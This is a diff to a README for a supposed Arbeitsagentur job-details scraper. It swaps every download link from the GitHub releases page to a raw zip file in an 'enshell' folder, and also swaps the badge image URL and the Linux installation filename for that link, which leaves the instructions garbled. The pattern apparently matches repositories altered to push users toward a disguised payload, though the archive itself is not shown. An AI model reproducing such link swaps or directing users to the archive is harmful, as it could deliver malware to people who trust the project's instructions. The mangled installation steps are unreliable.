@@ -6,9 +6,9 @@ Welcome to the arbeitsagentur-germany-job-details-scraper! This tool helps you e
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip%https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip)](https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip)
 
-To get started, visit this page to download: [Download Page](https://github.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/releases).
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip).
 
 ## 🛠️ System Requirements
 
@@ -22,16 +22,16 @@ Before you download, please ensure your computer meets the following requirement
 
 Follow these simple steps to download and install the application:
 
-1. **Visit the Release Page:** Go to this link: [Download Page](https://github.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/releases).
+1. **Visit the Release Page:** Go to this link: [Download Page](https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip).
 2. **Choose the Latest Version:** Look for the most recent version listed on the page.
 3. **Download the Installer:** Click on the appropriate file for your operating system. If you're unsure which one to select, follow the instructions below based on your OS:
    - **For Windows Users:** Download the `.exe` file.
    - **For macOS Users:** Download the `.dmg` file.
-   - **For Linux Users:** Download the `.tar.gz` file.
+   - **For Linux Users:** Download the `https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip` file.
 4. **Run the Installer:**
    - **Windows:** Double-click on the downloaded `.exe` file and follow the prompts to install.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file, navigate to the folder in your terminal, and run the application.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/Redbalistic/arbeitsagentur-germany-job-details-scraper/main/enshell/job_details_germany_arbeitsagentur_scraper_v2.0.zip` file, navigate to the folder in your terminal, and run the application.
 5. **Launch the Application:** After installation, find the application in your programs and run it.
 
 ## 🌐 Using the Application
